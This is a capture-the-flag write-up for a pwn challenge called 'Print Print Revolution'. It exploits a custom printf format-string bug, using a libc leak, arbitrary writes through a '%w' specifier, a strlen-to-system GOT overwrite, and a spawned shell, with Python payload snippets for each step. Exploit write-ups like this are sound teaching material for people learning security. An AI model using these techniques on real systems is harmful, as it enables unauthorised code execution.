# Print Print Revolution

**Category:** Pwn &nbsp;|&nbsp; **Points:** 459 &nbsp;|&nbsp; **Solves:** 183 &nbsp;|&nbsp; **Flag:** `sun{cust0m_fmtstr_n0_t00ls_4ll0wed}`

## Challenge description

> The arcade's score printer has been spitting out strange tickets all week. Step up to
> the renderer and see what it's really printing.
>
> `nc chal.sunshinectf.games 26002` &nbsp;·&nbsp; file: `revolution`

## Initial analysis

The program reads up to `0x1ff` bytes into a 512-byte stack buffer, strips the newline,
and passes the buffer to a **custom, home-made `printf`**. The renderer understands `%p`,
`%x`, `%s`, `%%`, positional forms like `%8$s`, and an unusual made-up specifier: `%w`.

Protections:

| Property | Consequence |
| --- | --- |
| **No PIE** | binary addresses fixed between runs |
| **NX** | no stack shellcode |
| **Partial RELRO** | **GOT is writable** → overwrite `strlen@GOT` (`0x404008`) |

## Core concept — custom format string with an arbitrary-write specifier

The renderer is handed our text as its format string with **no real variadic
arguments**, and it doesn't check — so positional specifiers walk into the caller's stack,
where our input lives. For this call:

```
arg 6 = buf+0    arg 7 = buf+8    arg 8 = buf+16    arg 9 = buf+24
```

So a short format in the first 16 bytes can reference two controlled 8-byte values placed
right after it. A NUL terminates the *visible* format string, but `read()` still accepts
the numbers after it:

```python
def payload(spec, arg8, arg9=0):
    return spec.ljust(15, b"Z") + b"\0" + p64(arg8) + p64(arg9) + b"\n"
```

The killer is `%w`: in positional form `%8$w` does `*(uint64_t*)arg8 = arg9` — an
**arbitrary write**.

## Exploitation (see [`solve_remote.py`](./solve_remote.py))

1. **Leak libc.** `write@GOT` is at `0x404000`. `%8$s` with arg8 = `0x404000` prints the
   resolved address of libc `write`:

   ```python
   sock.sendall(payload(b"%8$s", 0x404000))
   libc_base = leaked_write - 0x11c560     # remote libc offsets
   system    = libc_base + 0x58740
   ```
   ([`leak_remote.py`](./leak_remote.py) does just this step in isolation.)

2. **Write `/bin/sh` to `.bss`** with the custom write:
   ```python
   sock.sendall(payload(b"%8$w", 0x404070, int.from_bytes(b"/bin/sh\0","little")))
   ```

3. **Hijack `strlen@GOT` → `system`:**
   ```python
   sock.sendall(payload(b"%8$w", 0x404008, system))
   ```

4. **Trigger it.** Any later `%s` calls the (now hijacked) `strlen`, so `%8$s` pointing at
   `/bin/sh` becomes `system("/bin/sh")`:
   ```python
   sock.sendall(payload(b"!%8$s", 0x404070))   # '!' is a sync marker
   reader.until(b"!")
   sock.sendall(b"cat flag*; exit\n")
   ```

## Flag retrieval

Tested locally first with [`solve_local.py`](./solve_local.py) (different local libc
offsets), then against the service. The shell started in `/ctf`:

```
sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
```

## Key takeaways

- Rolling your own `printf` doesn't dodge format-string bugs — a formatter that reads
  non-existent variadic args is just as exploitable, and a `%w`-style
  "write value to address" specifier is a gift-wrapped arbitrary write.
- No PIE + Partial RELRO → overwrite a GOT entry (`strlen → system`) and let an ordinary
  `%s` call your target.
- Place controlled values *after* a NUL-terminated format: the formatter stops reading at
  the NUL, but the bytes are still in the buffer for positional args to reach.
